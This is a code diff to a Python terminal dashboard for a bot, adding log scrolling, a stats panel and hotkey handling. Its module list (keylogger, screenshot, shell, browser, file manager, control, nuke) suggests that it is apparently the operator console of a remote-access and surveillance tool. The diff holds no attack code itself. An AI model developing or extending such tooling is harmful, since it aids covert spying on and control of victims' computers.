@@ -39,10 +39,12 @@ class DeveloperTUI:
         self.log_queue = Queue()
         self.logs = []
         self.max_logs = 35
+        self.log_offset = 0 # Scroll offset
         self.start_time = time.time()
         self.is_running = True
         self.current_input = ""
         self.input_mode = False # Strict mode: must press F10 to type
+        self.show_stats = False # Toggle F2
         
         # Setup Logging redirection
         self.setup_logging()
@@ -101,20 +103,36 @@ class DeveloperTUI:
             return True
 
     def on_press(self, key):
-        # Always allow F10 to toggle input mode
+        # 1. Global F10 Toggle (Always check foreground first)
         if key == keyboard.Key.f10:
-            self.input_mode = not self.input_mode
-            status = "ENABLED" if self.input_mode else "DISABLED"
-            logging.info(f"[TUI] Manual Input {status} (F10)")
+            if self.is_foreground():
+                self.input_mode = not self.input_mode
+                status = "ENABLED" if self.input_mode else "DISABLED"
+                logging.info(f"[TUI] Manual Input {status} (F10)")
             return
 
-        # If input mode is disabled, ignore all other keys
-        if not self.input_mode:
+        # 2. Safety Gate: If not in foreground OR input mode is OFF, ignore everything else
+        if not self.is_foreground() or not self.input_mode:
             return
 
-        if not self.is_foreground():
+        # 3. Handle hotkeys (only when in focus and input mode enabled)
+        if key == keyboard.Key.f2:
+            self.show_stats = not self.show_stats
+            return
+        elif key == keyboard.Key.page_up:
+            self.log_offset = min(self.log_offset + 10, max(0, len(self.logs) - self.max_logs))
+            return
+        elif key == keyboard.Key.page_down:
+            self.log_offset = max(self.log_offset - 10, 0)
+            return
+        elif key == keyboard.Key.home:
+            self.log_offset = max(0, len(self.logs) - self.max_logs)
+            return
+        elif key == keyboard.Key.end:
+            self.log_offset = 0
             return
 
+        # 4. Handle character input
         try:
             if hasattr(key, 'char') and key.char:
                 self.current_input += key.char
@@ -203,7 +221,8 @@ class DeveloperTUI:
         return Panel(grid, style="white on blue", border_style="blue")
 
     def make_footer(self):
-        return Text(" [F5] Snapshot | [F6] Full Log | [F10] Toggle Input | [ESC] Clear | [ENTER] Run | [CTRL+C] Quit Safely ", style="dim cyan", justify="center")
+        scroll_info = f" [PgUp/PgDn] Scroll ({self.log_offset})" if self.log_offset > 0 else ""
+        return Text(f" [F2] Stats | [F5] Snapshot | [F6] Full Log | [F10] Toggle Input | [ESC] Clear | [ENTER] Run | [CTRL+C] Quit Safely{scroll_info} ", style="dim cyan", justify="center")
 
     def make_sidebar(self):
         table = Table(title="[bold]Modules[/bold]", border_style="cyan", expand=True, box=None)
@@ -212,7 +231,9 @@ class DeveloperTUI:
         
         all_possible = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
         for mod in all_possible:
-            state = "[green]●[/green]" if mod.capitalize() in self.bot.cogs else "[red]○[/red]"
+            # Fix capitalization for FileManager and others
+            cog_name = mod.replace("_", " ").title().replace(" ", "")
+            state = "[green]●[/green]" if cog_name in self.bot.cogs else "[red]○[/red]"
             table.add_row(mod, state)
             
         return Panel(table, border_style="cyan")
@@ -220,17 +241,23 @@ class DeveloperTUI:
     def make_log_view(self):
         # Process ALL pending logs from queue to stay current
         processed_count = 0
-        while not self.log_queue.empty() and processed_count < 100:
+        while not self.log_queue.empty() and processed_count < 200:
             self.logs.append(self.log_queue.get())
             processed_count += 1
             
-        # Limit memory (keep last 1000)
-        if len(self.logs) > 1000:
-            self.logs = self.logs[-1000:]
+        # Limit memory (keep last 2000)
+        if len(self.logs) > 2000:
+            self.logs = self.logs[-2000:]
 
         log_render = Text()
-        # View only the last max_logs entries (aggressive auto-scroll)
-        view_window = self.logs[-self.max_logs:] if len(self.logs) > self.max_logs else self.logs
+        
+        # Calculate view window based on offset
+        # offset 0 means the LATEST logs
+        total_logs = len(self.logs)
+        end_idx = total_logs - self.log_offset
+        start_idx = max(0, end_idx - self.max_logs)
+        
+        view_window = self.logs[start_idx:end_idx]
         
         for log in view_window:
             if "ERROR" in log or "FAILED" in log:
@@ -244,13 +271,34 @@ class DeveloperTUI:
             else:
                 log_render.append(log + "\n", style="white")
                 
-        return Panel(log_render, title=f"[bold]System Event Log ({len(self.logs)})[/bold]", border_style="green")
+        title = f"[bold]System Event Log ({total_logs})[/bold]"
+        if self.log_offset > 0:
+            title += f" [yellow](Scrolling: -{self.log_offset})[/yellow]"
+            
+        return Panel(log_render, title=title, border_style="green")
 
     def make_output_view(self):
         output_text = Text()
         output_text.append(" [SYSTEM] Command Results Window Active\n", style="bold cyan")
         output_text.append(" Waiting for local command execution results...", style="dim")
         return Panel(output_text, title="[bold]Command Results[/bold]", border_style="cyan")
+
+    def make_stats_view(self):
+        table = Table(title="[bold]System Stats[/bold]", border_style="yellow", expand=True, box=None)
+        table.add_column("Property", style="white")
+        table.add_column("Value", justify="right", style="cyan")
+        
+        cpu = psutil.cpu_percent()
+        mem = psutil.virtual_memory()
+        disk = psutil.disk_usage('/')
+        
+        table.add_row("CPU Usage", f"{cpu}%")
+        table.add_row("RAM Usage", f"{mem.percent}%")
+        table.add_row("Disk Usage", f"{disk.percent}%")
+        table.add_row("TUI Buffer", str(len(self.logs)))
+        table.add_row("Uptime", f"{int(time.time() - self.start_time)}s")
+        
+        return Panel(table, border_style="yellow")
 
     def make_input_panel(self):
         color = "green" if self.input_mode else "red"
@@ -284,6 +332,20 @@ class DeveloperTUI:
             # Increase refresh rate to 10 to feel more responsive
             with Live(layout, refresh_per_second=10, screen=True) as live:
                 while self.is_running:
+                    # Handle dynamic layout for stats
+                    if self.show_stats:
+                        layout["main"].split_row(
+                            Layout(name="sidebar", size=26),
+                            Layout(name="content"),
+                            Layout(name="stats_panel", size=26)
+                        )
+                        layout["stats_panel"].update(self.make_stats_view())
+                    else:
+                        layout["main"].split_row(
+                            Layout(name="sidebar", size=26),
+                            Layout(name="content")
+                        )
+
                     # Update data
                     layout["header"].update(self.make_header())
                     layout["sidebar"].update(self.make_sidebar())
